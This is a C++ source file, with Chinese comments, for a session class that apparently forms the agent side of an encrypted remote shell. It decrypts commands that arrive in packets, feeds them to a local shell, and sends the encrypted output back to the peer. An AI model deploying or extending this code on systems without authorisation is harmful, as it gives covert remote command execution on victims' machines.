#include "csession.h"

CSession::CSession()
{
	m_shell = new cshell_util;
	m_shell->m_send_cb = std::bind(&CSession::slice_data_to_pack, this, std::placeholders::_1, std::placeholders::_2, std::placeholders::_3);

	m_cape = new Cape((unsigned char*)m_key, 32, 36);

	//m_thd_resolve_send = new std::thread(tfun_resolve_send_cb, this);
	//m_thd_resolve_send->detach();

	m_thd_resolve_recv = new std::thread(tfun_resolve_recv_cb,this);
	m_thd_resolve_recv->detach();

	m_shell->create_shell();
}

CSession::~CSession()
{
	m_thd_running = 0;
	Sleep(40);
	if (m_shell != nullptr) delete m_shell;
	if (m_thd_resolve_send != nullptr) delete m_thd_resolve_send;
	if (m_thd_resolve_recv != nullptr) delete m_thd_resolve_recv;
	if (m_cape != nullptr) delete m_cape;
}

void CSession::tfun_resolve_recv_cb(void* param)
{
	CSession* p_this = (CSession*)param;

	int sleep_usec = 8;
	int loop = 0;

	while (p_this->m_thd_running)
	{
		if (p_this->m_list_recv_pack.empty())
		{
			Sleep(sleep_usec);
			loop++;
			if (loop * sleep_usec >= 1000 * 60 * 5)
			{
				p_this->m_thd_running = 0;
				p_this->m_delete_cb(p_this->m_sid);
				break;
			}
		}
		else
		{
			p_this->recv_pack((char*)p_this->m_list_recv_pack.front().c_str(), p_this->m_list_recv_pack.front().size());
			p_this->m_list_recv_pack.pop_front();
			loop = 0;
		}
	}
}

void CSession::tfun_resolve_send_cb(void* param)
{
	CSession* p_this = (CSession*)param;

	while (p_this->m_thd_running)
	{
		if (p_this->m_list_send_pack.empty())
		{
			Sleep(4);
		}
		else
		{
			p_this->send_pack((char*)p_this->m_list_send_pack.front().c_str(), p_this->m_list_send_pack.front().size());
			p_this->m_list_send_pack.pop_front();
		}
	}
}

int CSession::recv_pack(char* pack, int size)
{
	MY_TRANS_HEADER* p_header = (MY_TRANS_HEADER*)pack;

	//包数量 == 包序号，发送完成
	if (p_header->send_pack_seq == p_header->pack_count)
	{
		m_str_buff.append(pack + sizeof(MY_TRANS_HEADER), size - sizeof(MY_TRANS_HEADER));

		//解密数据
		char* dst_buff = new char[m_str_buff.size()]();
		m_cape->decrypt((unsigned char*)m_str_buff.c_str(), (unsigned char*)dst_buff, m_str_buff.size());

		if (strcmp(dst_buff, "exit") == 0)
		{
			//退出
			delete[] dst_buff;
			return -1;
		}
		else
		{
			//执行命令
			printf("[!]session buffer: %s\n", dst_buff);
			m_shell->write_shell_cmd(dst_buff, m_str_buff.size());
			delete[] dst_buff;
		}

		//clear string
		m_str_buff.clear();
	}

	//包数量 > 包序号，发送确认包
	else if (p_header->send_pack_seq < p_header->pack_count)
	{
		m_str_buff.append(pack + sizeof(MY_TRANS_HEADER), size - sizeof(MY_TRANS_HEADER));

		//发送ack包
		if (m_send_cb != nullptr)
		{
			//接收包序号
			p_header->recv_pack_ack = p_header->send_pack_seq;
			p_header->pack_size = sizeof(MY_TRANS_HEADER);
			m_send_cb(&m_sin,pack, p_header->pack_size);
		}
	}

	else
	{
		//

	}
	return 0;
}

int CSession::send_pack(char* data, int size)
{
	if (m_send_cb == nullptr)
	{
		return -1;
	}

	m_send_cb(&m_sin, data, size);
	return 0;
}

int CSession::slice_data_to_pack(short cmd, char* data, int size)
{
	//切分data为若干个发送包，获取包的数量
	int pack_count = (size / MAX_PACK_SIZE) + (size % MAX_PACK_SIZE == 0 ? 0 : 1);
	if (pack_count <= 0)
	{
		return -1;
	}
	else
	{
		//组合若干个包
		for (int i = 0; i < pack_count; i++)
		{
			//申请单个包大小
			std::string tmp;

			if (pack_count == 1)
			{
				//申请单个包大小
				tmp.resize(sizeof(MY_TRANS_HEADER) + size + 1);

				//设置header
				MY_TRANS_HEADER* p_hdr = (MY_TRANS_HEADER*)tmp.c_str();
				p_hdr->cmd = cmd;
				p_hdr->sid = m_sid;
				p_hdr->pack_size = sizeof(MY_TRANS_HEADER) + size + 1;
				p_hdr->pack_count = pack_count;
				p_hdr->recv_pack_ack = 0;
				p_hdr->send_pack_seq = 1;

				//加密数据
				m_cape->encrypt((unsigned char*)data, size, (unsigned char*)tmp.c_str() + sizeof(MY_TRANS_HEADER), rand());

			}
			else
			{
				tmp.resize(sizeof(MY_TRANS_HEADER) + MAX_PACK_SIZE + 1);

				//设置header
				MY_TRANS_HEADER* p_hdr = (MY_TRANS_HEADER*)tmp.c_str();
				p_hdr->cmd = cmd;
				p_hdr->sid = m_sid;
				p_hdr->pack_count = pack_count;
				p_hdr->recv_pack_ack = 0;
				p_hdr->send_pack_seq = i + 1;

				//复制数据
				if (i < pack_count - 1)
				{
					//memcpy((char*)tmp.c_str() + sizeof(MY_TRANS_HEADER), data + (i * MAX_PACK_SIZE), MAX_PACK_SIZE);

					p_hdr->pack_size = sizeof(MY_TRANS_HEADER) + MAX_PACK_SIZE + 1;

					//加密数据
					m_cape->encrypt((unsigned char*)data + (i * MAX_PACK_SIZE), MAX_PACK_SIZE, (unsigned char*)tmp.c_str() + sizeof(MY_TRANS_HEADER), rand());
				}
				else
				{
					//memcpy((char*)tmp.c_str() + sizeof(MY_TRANS_HEADER), data + (i * MAX_PACK_SIZE), size - (i * MAX_PACK_SIZE));

					p_hdr->pack_size = sizeof(MY_TRANS_HEADER) + size - (i * MAX_PACK_SIZE) + 1;

					//加密数据
					m_cape->encrypt((unsigned char*)data + (i * MAX_PACK_SIZE), size - (i * MAX_PACK_SIZE), (unsigned char*)tmp.c_str() + sizeof(MY_TRANS_HEADER), rand());
				}
			}

			//添加到list
			//m_list_send_pack.push_back(tmp);
			send_pack((char*)tmp.c_str(), tmp.size());
		}
		return 0;
	}
}
